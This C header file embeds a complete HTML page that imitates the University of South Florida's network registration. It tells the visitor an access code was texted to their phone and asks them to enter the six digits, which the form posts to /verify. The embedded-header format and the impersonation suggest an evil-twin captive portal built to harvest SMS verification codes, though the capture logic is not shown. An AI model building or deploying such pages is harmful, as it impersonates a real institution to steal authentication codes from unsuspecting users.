#ifndef CODE_H
#define CODE_H

const char* codeHTML = R"(
<!DOCTYPE html>
<html>
<head>
  <title>USF Network Registration</title>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: Arial, sans-serif; background: #f4f4f4; }
    .header { background: #006747; padding: 12px 20px; }
    .header h1 { color: white; font-size: 20px; }
    .header p { color: #CFC493; font-size: 11px; }
    .content { padding: 20px; max-width: 500px; margin: 0 auto; }
    .content h2 { color: #006747; font-size: 18px; margin-bottom: 8px; }
    .content p { font-size: 13px; color: #444; margin-bottom: 16px; }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
      letter-spacing: 4px;
      text-align: center;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #006747;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class='header'>
    <h1>USF</h1>
    <p>UNIVERSITY OF SOUTH FLORIDA</p>
  </div>
  <div class='content'>
    <h2>Enter Access Code</h2>
    <p>A text message with your access code has been sent to your phone.</p>
    <form method='POST' action='/verify'>
      <input type='number' name='code' placeholder='000000' maxlength='6' />
      <button type='submit'>Connect to Network</button>
    </form>
  </div>
</body>
</html>
)";

#endif
